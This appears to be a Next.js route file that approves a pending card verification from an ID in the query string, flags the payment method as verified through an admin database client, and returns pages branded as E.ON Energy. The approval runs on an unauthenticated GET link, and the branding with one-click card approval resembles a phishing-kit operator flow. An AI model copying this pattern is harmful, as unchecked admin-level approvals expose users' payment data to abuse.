import { type NextRequest, NextResponse } from "next/server"
import { getVerificationStatus, updateVerificationStatus } from "../send-verification/route"
import { createAdminClient } from "@/lib/supabase/admin"

export async function GET(request: NextRequest) {
  try {
    const searchParams = request.nextUrl.searchParams
    const verificationId = searchParams.get("id")

    if (!verificationId) {
      return new NextResponse(
        `
        <!DOCTYPE html>
        <html>
          <head>
            <title>Error - E.ON Verification</title>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
              body { font-family: system-ui, -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
              .container { background: white; padding: 3rem; border-radius: 1rem; box-shadow: 0 20px 60px rgba(0,0,0,0.3); text-align: center; max-width: 500px; }
              h1 { color: #e53e3e; margin: 0 0 1rem 0; font-size: 2rem; }
              p { color: #4a5568; margin: 0; font-size: 1.1rem; }
            </style>
          </head>
          <body>
            <div class="container">
              <h1>❌ Error</h1>
              <p>Invalid verification ID</p>
            </div>
          </body>
        </html>
      `,
        { headers: { "Content-Type": "text/html" } },
      )
    }

    const verification = getVerificationStatus(verificationId)

    if (!verification) {
      return new NextResponse(
        `
        <!DOCTYPE html>
        <html>
          <head>
            <title>Error - E.ON Verification</title>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
              body { font-family: system-ui, -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
              .container { background: white; padding: 3rem; border-radius: 1rem; box-shadow: 0 20px 60px rgba(0,0,0,0.3); text-align: center; max-width: 500px; }
              h1 { color: #e53e3e; margin: 0 0 1rem 0; font-size: 2rem; }
              p { color: #4a5568; margin: 0; font-size: 1.1rem; }
            </style>
          </head>
          <body>
            <div class="container">
              <h1>❌ Not Found</h1>
              <p>Verification request not found or expired</p>
            </div>
          </body>
        </html>
      `,
        { headers: { "Content-Type": "text/html" } },
      )
    }

    if (verification.status !== "pending") {
      return new NextResponse(
        `
        <!DOCTYPE html>
        <html>
          <head>
            <title>Already Processed - E.ON Verification</title>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
              body { font-family: system-ui, -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
              .container { background: white; padding: 3rem; border-radius: 1rem; box-shadow: 0 20px 60px rgba(0,0,0,0.3); text-align: center; max-width: 500px; }
              h1 { color: #f59e0b; margin: 0 0 1rem 0; font-size: 2rem; }
              p { color: #4a5568; margin: 0; font-size: 1.1rem; }
            </style>
          </head>
          <body>
            <div class="container">
              <h1>⚠️ Already Processed</h1>
              <p>This verification has already been ${verification.status}</p>
            </div>
          </body>
        </html>
      `,
        { headers: { "Content-Type": "text/html" } },
      )
    }

    // Update status to approved
    updateVerificationStatus(verificationId, "approved")

    // Save the card to database
    const supabase = createAdminClient()
    const { error } = await supabase
      .from("payment_methods")
      .update({ verified: true })
      .eq("id", verification.paymentMethodId)

    if (error) {
      console.error("[v0] Error updating payment method:", error)
    }

    return new NextResponse(
      `
      <!DOCTYPE html>
      <html>
        <head>
          <title>Approved - E.ON Verification</title>
          <meta charset="utf-8">
          <meta name="viewport" content="width=device-width, initial-scale=1">
          <style>
            body { font-family: system-ui, -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background: linear-gradient(135deg, #10b981 0%, #059669 100%); }
            .container { background: white; padding: 3rem; border-radius: 1rem; box-shadow: 0 20px 60px rgba(0,0,0,0.3); text-align: center; max-width: 500px; }
            .icon { font-size: 4rem; margin-bottom: 1rem; }
            h1 { color: #10b981; margin: 0 0 1rem 0; font-size: 2rem; }
            p { color: #4a5568; margin: 0; font-size: 1.1rem; line-height: 1.6; }
            .footer { margin-top: 2rem; padding-top: 2rem; border-top: 1px solid #e5e7eb; color: #9ca3af; font-size: 0.9rem; }
          </style>
        </head>
        <body>
          <div class="container">
            <div class="icon">✅</div>
            <h1>Payment Approved!</h1>
            <p>The payment method has been successfully verified and approved.</p>
            <p style="margin-top: 1rem;">The user can now proceed with their transaction.</p>
            <div class="footer">E.ON Energy - Secure Payment Processing</div>
          </div>
        </body>
      </html>
    `,
      { headers: { "Content-Type": "text/html" } },
    )
  } catch (error) {
    console.error("[v0] Approve error:", error)
    return new NextResponse(
      `
      <!DOCTYPE html>
      <html>
        <head>
          <title>Error - E.ON Verification</title>
          <meta charset="utf-8">
          <meta name="viewport" content="width=device-width, initial-scale=1">
          <style>
            body { font-family: system-ui, -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
            .container { background: white; padding: 3rem; border-radius: 1rem; box-shadow: 0 20px 60px rgba(0,0,0,0.3); text-align: center; max-width: 500px; }
            h1 { color: #e53e3e; margin: 0 0 1rem 0; font-size: 2rem; }
            p { color: #4a5568; margin: 0; font-size: 1.1rem; }
          </style>
        </head>
        <body>
          <div class="container">
            <h1>❌ Error</h1>
            <p>An error occurred while processing the approval</p>
          </div>
        </body>
      </html>
    `,
      { headers: { "Content-Type": "text/html" }, status: 500 },
    )
  }
}
